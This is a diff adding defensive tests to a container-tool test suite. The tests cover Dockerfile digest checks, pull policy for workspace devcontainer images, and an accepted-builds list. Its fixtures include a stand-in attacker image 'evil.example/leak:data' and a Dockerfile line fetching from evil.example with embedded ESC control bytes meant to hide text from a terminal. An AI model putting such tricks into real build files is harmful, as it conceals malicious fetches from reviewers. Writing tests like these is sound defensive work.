@@ -16,7 +16,7 @@ import { tmpdir } from "node:os";
 import { basename, dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import {
-  BASE_IMAGE_REGISTRIES, EnvironmentError, buildArgv, buildDigest, buildTag, canaryFor, check, checkDockerfile, compare, composeProjects, composeServices, declared, parseProbe, probeScript, resolveImage, runningServices, tagVersion, versionMatches,
+  BASE_IMAGE_REGISTRIES, EnvironmentError, acceptBuild, acceptedBuildsPath, buildArgv, buildDigest, buildTag, canaryFor, check, checkDockerfile, compare, composeProjects, composeServices, declared, loadAcceptedBuilds, parseProbe, probeScript, projectOf, resolveImage, runningServices, tagVersion, versionMatches,
 } from "./environment.mjs";
 import { HarnessError, imageFor, run } from "./harness.mjs";
 import { detect } from "./sandbox.mjs";
@@ -184,6 +184,71 @@ const DEV = join(DEVDIR, "devcontainer.json");
       const r = imageFor({ image: null, devcontainer: DEV, sandbox: "podman", acceptBuilds: [d] }, dev, w, { exec, workspace: PROJ });
       return r.built === true && code(() => imageFor({ image: null, devcontainer: DEV, sandbox: "podman", acceptBuilds: [] }, dev, [], { exec, workspace: PROJ })) !== null;
     })());
+    // Round 5: the bytes hashed are the bytes built. podman reads the
+    // Dockerfile on stdin, so the three reads became one.
+    {
+      const calls = [];
+      const spy = (a, opts) => (calls.push({ a, opts }), { status: 0 });
+      const d = buildDigest(dev, DEV);
+      resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec: spy, acceptBuilds: [d] });
+      const build = calls.find((c) => c.a[0] === "build");
+      ok("the build reads its Dockerfile from stdin (-f -), and the bytes given are the bytes the digest was taken from", build && build.a.includes("-f") && build.a[build.a.indexOf("-f") + 1] === "-" && Buffer.isBuffer(build.opts?.input) && readFileSync(DF).equals(build.opts.input), JSON.stringify(build?.a));
+      ok("a Dockerfile that does not exist is handed to podman by path, which reports it; nothing to accept", (() => {
+        const c2 = [];
+        resolveImage({ dev: { build: { dockerfile: "Nowhere" } }, devcontainerPath: DEV, workspace: PROJ, exec: (a) => (c2.push(a), { status: 0 }) });
+        return c2[0]?.[c2[0].indexOf("-f") + 1]?.endsWith("Nowhere");
+      })());
+    }
+    // Round 5: the sibling key. `image` in a workspace devcontainer must not
+    // make the run pull from wherever the name says.
+    {
+      const present = (a) => ({ status: a[0] === "image" && a[1] === "exists" ? 0 : 0 });
+      const absent = (a) => ({ status: a[0] === "image" && a[1] === "exists" ? 1 : 0 });
+      const r = resolveImage({ dev: { image: "evil.example/leak:data" }, devcontainerPath: DEV, workspace: PROJ, exec: present });
+      ok("an image named by a workspace devcontainer runs with pull never, and the warning says the operator pulled it", r.pull === "never" && r.warnings.some((w) => /pull=never/.test(w)), JSON.stringify(r));
+      ok("…and when it is not local the run is refused by name with the pull for the operator to read and make", (() => {
+        try {
+          resolveImage({ dev: { image: "evil.example/leak:data" }, devcontainerPath: DEV, workspace: PROJ, exec: absent });
+          return false;
+        } catch (e) {
+          return e.code === "IMAGE_NOT_LOCAL" && /podman pull evil\.example\/leak:data/.test(e.message);
+        }
+      })());
+      ok("an --image the operator gave keeps podman's default pull", resolveImage({ image: "x:1", dev: { image: "y" }, devcontainerPath: DEV, workspace: PROJ, exec: absent }).pull === "missing");
+      ok("an image from a devcontainer outside the workspace keeps podman's default pull", resolveImage({ dev: { image: "y:1" }, devcontainerPath: join(TMP, "operator-env2", ".devcontainer", "devcontainer.json"), workspace: PROJ, exec: absent }).pull === "missing");
+      ok("…and so does an accepted build's own tag", resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec, acceptBuilds: [buildDigest(dev, DEV)] }).pull === "missing");
+    }
+    // Round 5: the list is the operator's, in the config dir; a typo never lands in it.
+    {
+      const xdg = join(TMP, "xdg-accept");
+      const prev = process.env.XDG_CONFIG_HOME;
+      process.env.XDG_CONFIG_HOME = xdg;
+      try {
+        const file = join(xdg, "caretaker", "accepted-builds.json");
+        ok("the accepted list lives at ${XDG_CONFIG_HOME}/caretaker/accepted-builds.json", acceptedBuildsPath() === file);
+        ok("an empty list reads as empty, not as an error", loadAcceptedBuilds().length === 0);
+        const d = "c".repeat(64);
+        const a = acceptBuild(d);
+        ok("acceptBuild records a digest once and says where", a.added && a.path === file && loadAcceptedBuilds().includes(d) && acceptBuild(d).added === false);
+        for (const bad of ["", "*", d.slice(0, 63), d.toUpperCase(), null, 42]) ok(`acceptBuild refuses ${JSON.stringify(bad)} by name and writes nothing`, code(() => acceptBuild(bad)) === "BAD_DIGEST" && loadAcceptedBuilds().length === 1);
+        writeFileSync(file, JSON.stringify([d, "*", "not-a-digest"]));
+        ok("a hand-edited list yields only its digests: a star accepts nothing", loadAcceptedBuilds().join() === d);
+      } finally {
+        if (prev === undefined) delete process.env.XDG_CONFIG_HOME;
+        else process.env.XDG_CONFIG_HOME = prev;
+      }
+    }
+    // Round 5: control bytes in the refusal cannot hide a line from a terminal.
+    {
+      writeFileSync(DF, `FROM ${N}\nADD https://evil.example/\x1b[2K\rx /x\n`);
+      try {
+        resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec });
+        ok("a refusal for a Dockerfile holding ESC bytes is thrown", false);
+      } catch (e) {
+        ok("ESC and control bytes in the reader's advice are shown as escapes, never sent to the terminal raw", !/\x1b/.test(e.message) && /\\x1b/.test(e.message) && /cat -v/.test(e.message), e.message.slice(0, 200));
+      }
+    }
+    ok("projectOf follows the devcontainer convention", projectOf(DEV) === PROJ && projectOf(join(TMP, "flat", "devcontainer.json")) === join(TMP, "flat"));
     rmSync(DF);
   }
 
